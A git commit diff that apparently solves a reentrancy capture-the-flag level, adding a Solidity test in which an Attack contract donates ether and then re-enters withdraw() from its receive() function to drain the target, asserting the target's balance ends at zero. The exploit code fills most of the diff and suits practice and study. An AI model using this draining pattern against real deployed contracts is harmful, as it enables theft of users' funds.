6f51f8ab487a9d1e1b9f4d4298cbb61c05acfbbf
Viktor Lavrenenko <lavrenenkoviktoren@gmail.com>
2023-01-13 09:01:47 +0200

    Add tests for Reentrance.t.sol

--- test/Reentrance.t.sol
+++ test/Reentrance.t.sol
@@ -25,79 +25,32 @@ contract ReentranceTest is Test {
         vm.startPrank(HACKER);
         attack.attack.value(1e18)();
         // vm.stopPrank();
-        console.log(address(reentrance).balance);
+        assertEq(address(reentrance).balance, 0);
     }
 }
-
-// contract Attack {
-//     Reentrance public reentrance;
-
-//     constructor(address _reentranceAddress) {
-//         reentrance = Reentrance(payable(_reentranceAddress));
-//     }
-
-//     receive() external payable {
-//         if (address(reentrance).balance >= 1 ether) {
-//             reentrance.withdraw(1e18);
-//         }
-//     }
-
-//     function attack() external payable {
-//         require(msg.value >= 1 ether);
-//         reentrance.donate{value: msg.value}(address(this));
-//         reentrance.withdraw(msg.value);
-//     }
-
-//     // Helper function to check the balance of this contract
-//     function getBalance() public view returns (uint) {
-//         return address(this).balance;
-//     }
-// }
-
-
-interface IReentrance {
-    function donate(address) external payable;
-    function withdraw(uint) external;
-}
-
 
 contract Attack {
-    IReentrance public challenge;
-    uint256 initialDeposit;
+    Reentrance public reentrance;
 
-    constructor(address challengeAddress) {
-        challenge = IReentrance(challengeAddress);
-    }
-
-    function attack() external payable {
-        require(msg.value >= 0.1 ether, "send some more ether");
-
-        // first deposit some funds
-        initialDeposit = msg.value;
-        challenge.donate.value(initialDeposit)(address(this));
-
-        // withdraw these funds over and over again because of re-entrancy issue
-        callWithdraw();
+    constructor(address _reentranceAddress) public {
+        reentrance = Reentrance(payable(_reentranceAddress));
     }
 
     receive() external payable {
-        // re-entrance called by challenge
-        callWithdraw();
-    }
-
-    function callWithdraw() private {
-        // this balance correctly updates after withdraw
-        uint256 challengeTotalRemainingBalance = address(challenge).balance;
-        // are there more tokens to empty?
-        bool keepRecursing = challengeTotalRemainingBalance > 0;
-
-        if (keepRecursing) {
-            // can only withdraw at most our initial balance per withdraw call
-            uint256 toWithdraw =
-                initialDeposit < challengeTotalRemainingBalance
-                    ? initialDeposit
-                    : challengeTotalRemainingBalance;
-            challenge.withdraw(toWithdraw);
+        if (address(reentrance).balance >= 1 ether) {
+            reentrance.withdraw(1e18);
         }
     }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        reentrance.donate.value(msg.value)(address(this));
+        reentrance.withdraw(msg.value);
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
 }
+
